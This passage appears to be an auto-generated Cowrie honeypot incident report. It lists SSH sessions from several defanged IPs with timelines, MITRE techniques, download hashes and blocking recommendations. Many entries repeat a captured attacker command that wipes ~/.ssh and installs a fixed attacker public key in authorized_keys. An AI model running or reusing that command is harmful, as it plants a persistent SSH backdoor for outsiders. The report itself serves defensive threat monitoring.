**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6011ba3dceab

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-11 06:11 |
| **Last Seen** | 2026-04-11 06:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:11:10` | `cowrie.session.connect` |
| `2026-04-11 06:11:10` | `cowrie.client.version` |
| `2026-04-11 06:11:10` | `cowrie.client.kex` |
| `2026-04-11 06:11:11` | `cowrie.login.success` |
| `2026-04-11 06:11:12` | `cowrie.session.params` |
| `2026-04-11 06:11:12` | `cowrie.command.input` |
| `2026-04-11 06:11:12` | `cowrie.command.failed` |
| `2026-04-11 06:11:12` | `cowrie.log.closed` |
| `2026-04-11 06:11:13` | `cowrie.session.params` |
| `2026-04-11 06:11:13` | `cowrie.command.input` |
| `2026-04-11 06:11:13` | `cowrie.session.file_download` |
| `2026-04-11 06:11:13` | `cowrie.log.closed` |
| `2026-04-11 06:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b8b195b020b

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-11 06:11 |
| **Last Seen** | 2026-04-11 06:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:11:16` | `cowrie.session.connect` |
| `2026-04-11 06:11:16` | `cowrie.client.version` |
| `2026-04-11 06:11:16` | `cowrie.client.kex` |
| `2026-04-11 06:11:17` | `cowrie.login.success` |
| `2026-04-11 06:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-972c994f37a9

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:11 |
| **Last Seen** | 2026-04-11 06:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:11:51` | `cowrie.session.connect` |
| `2026-04-11 06:11:51` | `cowrie.client.version` |
| `2026-04-11 06:11:51` | `cowrie.client.kex` |
| `2026-04-11 06:11:51` | `cowrie.login.success` |
| `2026-04-11 06:11:52` | `cowrie.session.params` |
| `2026-04-11 06:11:52` | `cowrie.command.input` |
| `2026-04-11 06:11:52` | `cowrie.command.failed` |
| `2026-04-11 06:11:52` | `cowrie.log.closed` |
| `2026-04-11 06:11:52` | `cowrie.session.params` |
| `2026-04-11 06:11:52` | `cowrie.command.input` |
| `2026-04-11 06:11:52` | `cowrie.session.file_download` |
| `2026-04-11 06:11:52` | `cowrie.log.closed` |
| `2026-04-11 06:11:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25b391ffd325

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-11 06:11 |
| **Last Seen** | 2026-04-11 06:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:11:51` | `cowrie.session.connect` |
| `2026-04-11 06:11:51` | `cowrie.client.version` |
| `2026-04-11 06:11:52` | `cowrie.client.kex` |
| `2026-04-11 06:11:53` | `cowrie.login.success` |
| `2026-04-11 06:11:53` | `cowrie.session.params` |
| `2026-04-11 06:11:53` | `cowrie.command.input` |
| `2026-04-11 06:11:53` | `cowrie.command.failed` |
| `2026-04-11 06:11:53` | `cowrie.log.closed` |
| `2026-04-11 06:11:54` | `cowrie.session.params` |
| `2026-04-11 06:11:54` | `cowrie.command.input` |
| `2026-04-11 06:11:54` | `cowrie.session.file_download` |
| `2026-04-11 06:11:54` | `cowrie.log.closed` |
| `2026-04-11 06:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9255ab32fec

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:11 |
| **Last Seen** | 2026-04-11 06:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:11:54` | `cowrie.session.connect` |
| `2026-04-11 06:11:54` | `cowrie.client.version` |
| `2026-04-11 06:11:54` | `cowrie.client.kex` |
| `2026-04-11 06:11:54` | `cowrie.login.success` |
| `2026-04-11 06:11:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb14bd5b0af6

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-04-11 06:11 |
| **Last Seen** | 2026-04-11 06:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:11:54` | `cowrie.session.connect` |
| `2026-04-11 06:11:54` | `cowrie.client.version` |
| `2026-04-11 06:11:54` | `cowrie.client.kex` |
| `2026-04-11 06:11:55` | `cowrie.login.success` |
| `2026-04-11 06:11:55` | `cowrie.session.params` |
| `2026-04-11 06:11:55` | `cowrie.command.input` |
| `2026-04-11 06:11:55` | `cowrie.command.failed` |
| `2026-04-11 06:11:55` | `cowrie.log.closed` |
| `2026-04-11 06:11:56` | `cowrie.session.params` |
| `2026-04-11 06:11:56` | `cowrie.command.input` |
| `2026-04-11 06:11:56` | `cowrie.session.file_download` |
| `2026-04-11 06:11:56` | `cowrie.log.closed` |
| `2026-04-11 06:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ad69d839858

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-11 06:11 |
| **Last Seen** | 2026-04-11 06:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:11:57` | `cowrie.session.connect` |
| `2026-04-11 06:11:57` | `cowrie.client.version` |
| `2026-04-11 06:11:58` | `cowrie.client.kex` |
| `2026-04-11 06:11:59` | `cowrie.login.success` |
| `2026-04-11 06:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0655dab7f020

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-04-11 06:11 |
| **Last Seen** | 2026-04-11 06:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:11:58` | `cowrie.session.connect` |
| `2026-04-11 06:11:58` | `cowrie.client.version` |
| `2026-04-11 06:11:58` | `cowrie.client.kex` |
| `2026-04-11 06:11:58` | `cowrie.login.success` |
| `2026-04-11 06:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06ebf34ca6cc

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-04-11 06:12 |
| **Last Seen** | 2026-04-11 06:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:12:24` | `cowrie.session.connect` |
| `2026-04-11 06:12:24` | `cowrie.client.version` |
| `2026-04-11 06:12:24` | `cowrie.client.kex` |
| `2026-04-11 06:12:26` | `cowrie.login.success` |
| `2026-04-11 06:12:27` | `cowrie.session.params` |
| `2026-04-11 06:12:27` | `cowrie.command.input` |
| `2026-04-11 06:12:27` | `cowrie.command.failed` |
| `2026-04-11 06:12:27` | `cowrie.log.closed` |
| `2026-04-11 06:12:28` | `cowrie.session.params` |
| `2026-04-11 06:12:28` | `cowrie.command.input` |
| `2026-04-11 06:12:28` | `cowrie.session.file_download` |
| `2026-04-11 06:12:28` | `cowrie.log.closed` |
| `2026-04-11 06:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a73a994e402a

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-04-11 06:12 |
| **Last Seen** | 2026-04-11 06:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:12:32` | `cowrie.session.connect` |
| `2026-04-11 06:12:32` | `cowrie.client.version` |
| `2026-04-11 06:12:33` | `cowrie.client.kex` |
| `2026-04-11 06:12:34` | `cowrie.login.success` |
| `2026-04-11 06:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbac52a132da

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:13 |
| **Last Seen** | 2026-04-11 06:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:13:20` | `cowrie.session.connect` |
| `2026-04-11 06:13:20` | `cowrie.client.version` |
| `2026-04-11 06:13:20` | `cowrie.client.kex` |
| `2026-04-11 06:13:21` | `cowrie.login.success` |
| `2026-04-11 06:13:21` | `cowrie.session.params` |
| `2026-04-11 06:13:21` | `cowrie.command.input` |
| `2026-04-11 06:13:21` | `cowrie.command.failed` |
| `2026-04-11 06:13:21` | `cowrie.log.closed` |
| `2026-04-11 06:13:21` | `cowrie.session.params` |
| `2026-04-11 06:13:21` | `cowrie.command.input` |
| `2026-04-11 06:13:21` | `cowrie.session.file_download` |
| `2026-04-11 06:13:21` | `cowrie.log.closed` |
| `2026-04-11 06:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca5409354c38

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:13 |
| **Last Seen** | 2026-04-11 06:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:13:23` | `cowrie.session.connect` |
| `2026-04-11 06:13:23` | `cowrie.client.version` |
| `2026-04-11 06:13:23` | `cowrie.client.kex` |
| `2026-04-11 06:13:23` | `cowrie.login.success` |
| `2026-04-11 06:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deaece47bfb8

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:14 |
| **Last Seen** | 2026-04-11 06:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:14:02` | `cowrie.session.connect` |
| `2026-04-11 06:14:02` | `cowrie.client.version` |
| `2026-04-11 06:14:02` | `cowrie.client.kex` |
| `2026-04-11 06:14:02` | `cowrie.login.success` |
| `2026-04-11 06:14:03` | `cowrie.session.params` |
| `2026-04-11 06:14:03` | `cowrie.command.input` |
| `2026-04-11 06:14:03` | `cowrie.command.failed` |
| `2026-04-11 06:14:03` | `cowrie.log.closed` |
| `2026-04-11 06:14:03` | `cowrie.session.params` |
| `2026-04-11 06:14:03` | `cowrie.command.input` |
| `2026-04-11 06:14:03` | `cowrie.session.file_download` |
| `2026-04-11 06:14:03` | `cowrie.log.closed` |
| `2026-04-11 06:14:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-636a8a3d75c2

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:14 |
| **Last Seen** | 2026-04-11 06:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:14:05` | `cowrie.session.connect` |
| `2026-04-11 06:14:05` | `cowrie.client.version` |
| `2026-04-11 06:14:05` | `cowrie.client.kex` |
| `2026-04-11 06:14:05` | `cowrie.login.success` |
| `2026-04-11 06:14:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-410618a06ffe

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-11 06:14 |
| **Last Seen** | 2026-04-11 06:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:14:38` | `cowrie.session.connect` |
| `2026-04-11 06:14:38` | `cowrie.client.version` |
| `2026-04-11 06:14:39` | `cowrie.client.kex` |
| `2026-04-11 06:14:40` | `cowrie.login.success` |
| `2026-04-11 06:14:40` | `cowrie.session.params` |
| `2026-04-11 06:14:40` | `cowrie.command.input` |
| `2026-04-11 06:14:40` | `cowrie.command.failed` |
| `2026-04-11 06:14:40` | `cowrie.log.closed` |
| `2026-04-11 06:14:41` | `cowrie.session.params` |
| `2026-04-11 06:14:41` | `cowrie.command.input` |
| `2026-04-11 06:14:41` | `cowrie.session.file_download` |
| `2026-04-11 06:14:41` | `cowrie.log.closed` |
| `2026-04-11 06:14:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6caea63b001a

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-04-11 06:14 |
| **Last Seen** | 2026-04-11 06:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:14:43` | `cowrie.session.connect` |
| `2026-04-11 06:14:43` | `cowrie.client.version` |
| `2026-04-11 06:14:43` | `cowrie.client.kex` |
| `2026-04-11 06:14:43` | `cowrie.login.success` |
| `2026-04-11 06:14:43` | `cowrie.session.params` |
| `2026-04-11 06:14:43` | `cowrie.command.input` |
| `2026-04-11 06:14:43` | `cowrie.command.failed` |
| `2026-04-11 06:14:43` | `cowrie.log.closed` |
| `2026-04-11 06:14:44` | `cowrie.session.params` |
| `2026-04-11 06:14:44` | `cowrie.command.input` |
| `2026-04-11 06:14:44` | `cowrie.session.file_download` |
| `2026-04-11 06:14:44` | `cowrie.log.closed` |
| `2026-04-11 06:14:46` | `cowrie.session.closed` |

**Recommended Actions:**
